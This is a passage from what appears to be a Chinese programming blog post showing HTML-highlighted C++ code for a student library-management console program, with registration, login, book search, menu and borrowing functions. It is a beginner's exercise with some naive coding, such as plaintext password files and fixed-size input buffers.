class="keyword">long</span> <span class="keyword">long</span> teacher_ID;</span><br><span class="line">		<span class="keyword">char</span> *teacher_password;</span><br><span class="line">		<span class="keyword">char</span> *ownbook_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		Teachers() &#123;</span><br><span class="line">			ownbook_name = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">10</span>];</span><br><span class="line">			<span class="built_in">strcpy</span>(ownbook_name, <span class="string">&quot;-No Book-&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		~Teachers() &#123;</span><br><span class="line">			<span class="keyword">delete</span> []teacher_name;</span><br><span class="line">			<span class="keyword">delete</span> []ownbook_name;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">registered</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//教师注册</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//教师登录</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">choose</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//选择功能</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">borrow</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//借书</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">repay</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//还书</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h2 id="basic-cpp"><a href="#basic-cpp" class="headerlink" title="basic.cpp"></a>basic.cpp</h2><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;basic.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//搜索书籍信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Basic::booksearch</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fstream <span class="built_in">read</span>;</span><br><span class="line">	book searching;</span><br><span class="line">	<span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//用于判断是否存在此书籍</span></span><br><span class="line">	<span class="keyword">while</span> (m == <span class="number">0</span>) &#123;	<span class="comment">//当此书籍不存在时 循环输入</span></span><br><span class="line">		<span class="built_in">read</span>.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入想查找的图书名:\t&quot;</span>;</span><br><span class="line">		<span class="keyword">char</span> s[<span class="number">25</span>];</span><br><span class="line">		<span class="built_in">cin</span>.getline(s, <span class="number">25</span>);</span><br><span class="line">		book_name = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(s) + <span class="number">1</span>];</span><br><span class="line">		<span class="built_in">strcpy</span>(book_name, s);</span><br><span class="line">		<span class="keyword">while</span> (!<span class="built_in">read</span>.eof()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">read</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="built_in">read</span>.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;searching, <span class="keyword">sizeof</span>(searching));</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(book_name, searching.book_name)) &#123;</span><br><span class="line">				m = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍名称:\t&quot;</span> &lt;&lt; searching.book_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍作者:\t&quot;</span> &lt;&lt; searching.book_author &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍位置:\t&quot;</span> &lt;&lt; searching.book_location &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;剩余数量:\t&quot;</span> &lt;&lt; searching.book_num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;	<span class="comment">//无break时，在搜索文件中最后一个书籍时会输出两次</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">read</span>.<span class="built_in">close</span>();</span><br><span class="line">		<span class="comment">//*****注意关闭文件！未关闭文件时指针一直在文件结尾*****</span></span><br><span class="line">		<span class="keyword">if</span> (m == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍不存在!请重新输入!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//学生注册</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Students::registered</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	fstream <span class="built_in">write</span>;	<span class="comment">//将学生注册信息写入文件</span></span><br><span class="line">	<span class="built_in">write</span>.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">	students registered;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入您的姓名:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span>.getline(registered.name, <span class="number">10</span>);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入您的学号:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; registered.ID;</span><br><span class="line">	<span class="built_in">cin</span>.ignore();</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入密码:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span>.getline(registered.password, <span class="number">10</span>);</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请确认密码:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span>.getline(password, <span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, registered.password)) &#123;</span><br><span class="line">		<span class="built_in">write</span>.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;registered, <span class="keyword">sizeof</span>(registered));</span><br><span class="line">		<span class="built_in">write</span>.<span class="built_in">close</span>();</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;注册成功!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="built_in">strcmp</span>(password, registered.password)) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;两次密码输入不一致 请重新输入:\t&quot;</span>;</span><br><span class="line">			<span class="built_in">cin</span>.getline(password, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, registered.password)) &#123;</span><br><span class="line">			<span class="built_in">write</span>.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;registered, <span class="keyword">sizeof</span>(registered));</span><br><span class="line">			<span class="built_in">write</span>.<span class="built_in">close</span>();</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;注册成功!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//学生登录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Students::login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fstream <span class="built_in">read</span>;</span><br><span class="line">	students login;</span><br><span class="line">	<span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//用于判断是否存在此用户</span></span><br><span class="line">	<span class="keyword">while</span> (m == <span class="number">0</span>) &#123;	<span class="comment">//当用户ID不存在时 循环输入</span></span><br><span class="line">		<span class="built_in">read</span>.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入您的学号:\t&quot;</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; student_ID;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//用于判断终止循环</span></span><br><span class="line">		<span class="keyword">while</span> (!<span class="built_in">read</span>.eof()) &#123;</span><br><span class="line">			<span class="built_in">read</span>.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;login, <span class="keyword">sizeof</span>(login));</span><br><span class="line">			<span class="keyword">if</span> (student_ID == login.ID) &#123;</span><br><span class="line">				m = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">char</span> s[<span class="number">10</span>];</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入密码:\t&quot;</span>;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					student_password = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(s) + <span class="number">1</span>];</span><br><span class="line">					<span class="built_in">strcpy</span>(student_password, s);</span><br><span class="line">					<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(student_password, login.password)) &#123;</span><br><span class="line">						n = <span class="number">1</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n********************************登录成功********************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						student_name = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(login.name) + <span class="number">1</span>];</span><br><span class="line">						<span class="built_in">strcpy</span>(student_name, login.name);</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; login.name &lt;&lt; <span class="string">&quot;同学 您好!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****个人信息*****&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;姓名:\t&quot;</span> &lt;&lt; login.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID:\t&quot;</span> &lt;&lt; login.ID &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;已借书籍:\t&quot;</span> &lt;&lt; login.ownbook_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						choose();</span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;密码错误，请重试!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">read</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (m == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*************************用户不存在!请重新输入!*************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">read</span>.<span class="built_in">close</span>();</span><br><span class="line">		<span class="comment">//*****注意关闭文件！未关闭文件时指针一直在文件结尾*****</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//教师注册</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Teachers::registered</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fstream <span class="built_in">write</span>;</span><br><span class="line">	<span class="comment">//将教师注册信息写入文件</span></span><br><span class="line">	<span class="built_in">write</span>.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">	teachers registered;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入您的姓名:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span>.getline(registered.name, <span class="number">10</span>);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入您的工号:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; registered.ID;</span><br><span class="line">	<span class="built_in">cin</span>.ignore();</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入密码:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span>.getline(registered.password, <span class="number">10</span>);</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请确认密码:\t&quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span>.getline(password, <span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, registered.password)) &#123;</span><br><span class="line">		<span class="built_in">write</span>.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;registered, <span class="keyword">sizeof</span>(registered));</span><br><span class="line">		<span class="built_in">write</span>.<span class="built_in">close</span>();</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;注册成功!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="built_in">strcmp</span>(password, registered.password)) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;两次密码输入不一致 请重新输入:\t&quot;</span>;</span><br><span class="line">			<span class="built_in">cin</span>.getline(password, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, registered.password)) &#123;</span><br><span class="line">			<span class="built_in">write</span>.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;registered, <span class="keyword">sizeof</span>(registered));</span><br><span class="line">			<span class="built_in">write</span>.<span class="built_in">close</span>();</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;注册成功!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//教师登录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Teachers::login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fstream <span class="built_in">read</span>;</span><br><span class="line">	teachers login;</span><br><span class="line">	<span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//用于判断是否存在此用户</span></span><br><span class="line">	<span class="keyword">while</span> (m == <span class="number">0</span>) &#123;	<span class="comment">//当用户ID不存在时 循环输入</span></span><br><span class="line">		<span class="built_in">read</span>.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入您的学号:\t&quot;</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; teacher_ID;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//用于判断终止循环</span></span><br><span class="line">		<span class="keyword">while</span> (!<span class="built_in">read</span>.eof()) &#123;</span><br><span class="line">			<span class="built_in">read</span>.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;login, <span class="keyword">sizeof</span>(login));</span><br><span class="line">			<span class="keyword">if</span> (teacher_ID == login.ID) &#123;</span><br><span class="line">				m = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">char</span> s[<span class="number">10</span>];</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入密码:\t&quot;</span>;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					teacher_password = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(s) + <span class="number">1</span>];</span><br><span class="line">					<span class="built_in">strcpy</span>(teacher_password, s);</span><br><span class="line">					<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(teacher_password, login.password)) &#123;</span><br><span class="line">						n = <span class="number">1</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n********************************登录成功********************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						teacher_name = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(login.name) + <span class="number">1</span>];</span><br><span class="line">						<span class="built_in">strcpy</span>(teacher_name, login.name);</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; login.name &lt;&lt; <span class="string">&quot;同学 您好!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****个人信息*****&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;姓名:\t&quot;</span> &lt;&lt; login.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID:\t&quot;</span> &lt;&lt; login.ID &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;已借书籍:\t&quot;</span> &lt;&lt; login.ownbook_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">						choose();</span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;密码错误，请重试!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">read</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (m == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*************************用户不存在!请重新输入!*************************&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">read</span>.<span class="built_in">close</span>();</span><br><span class="line">		<span class="comment">//*****注意关闭文件！未关闭文件时指针一直在文件结尾*****</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//学生选择功能</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Students::choose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> judge1;</span><br><span class="line">	<span class="comment">//判断功能</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请选择:\t1.查找书籍&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t2.借阅书籍&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t3.归还书籍&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t4.修改密码&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t0.退出登录&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		<span class="keyword">switch</span> (judge1) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;</span><br><span class="line">				booksearch();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;</span><br><span class="line">				borrow();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: &#123;</span><br><span class="line">				repay();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>: &#123;</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">default</span>: &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//教师选择功能</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Teachers::choose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> judge1;</span><br><span class="line">	<span class="comment">//判断功能</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请选择:\t1.查找书籍&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t2.借阅书籍&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t3.归还书籍&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t4.修改密码&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;       \t0.退出登录&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		<span class="keyword">switch</span> (judge1) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;</span><br><span class="line">				booksearch();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;</span><br><span class="line">				borrow();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: &#123;</span><br><span class="line">				repay();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>: &#123;</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//学生借书函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Students::borrow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fstream writefile;</span><br><span class="line">	fstream readfile1;</span><br><span class="line">	<span class="comment">//读取books.dat</span></span><br><span class="line">	fstream readfile2;</span><br><span class="line">	<span class="comment">//读取books_copy.dat</span></span><br><span class="line">	book borrow;</span><br><span class="line">	book mid1;</span><br><span class="line">	<span class="comment">//读取文件，遍历结构体中的书籍名</span></span><br><span class="line">	book mid2;</span><br><span class="line">	<span class="comment">//读取文件，存储非添加书籍的结构体</span></span><br><span class="line">	students add_ownbook;</span><br><span class="line">	<span class="comment">//在文件里添加借阅书籍信息</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//判断书籍是否已存在</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要借阅的书籍名:\t&quot;</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; borrow.book_name;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">		<span class="keyword">while</span> (!readfile1.eof()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!readfile1)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			readfile1.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">			<span class="keyword">if</span> ((<span class="built_in">strcmp</span>(mid1.book_name, borrow.book_name) == <span class="number">0</span>) &amp;&amp; (mid1.book_num != <span class="number">0</span>)) &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;馆内现有《&quot;</span> &lt;&lt; mid1.book_name &lt;&lt; <span class="string">&quot;》&quot;</span> &lt;&lt; mid1.book_num &lt;&lt; <span class="string">&quot;本&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				m = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****书籍信息*****\n&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍名称:\t&quot;</span> &lt;&lt; mid1.book_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍作者:\t&quot;</span> &lt;&lt; mid1.book_author &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍位置:\t&quot;</span> &lt;&lt; mid1.book_location &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;是否确定借阅？(Y/N)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">char</span> judge;</span><br><span class="line">				<span class="comment">//判断是否确定借阅</span></span><br><span class="line">				<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">					<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">					<span class="comment">//判断什么时候跳出此while循环</span></span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; judge;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					<span class="keyword">switch</span> (judge) &#123;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;Y&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							fstream borrow_read;</span><br><span class="line">							fstream 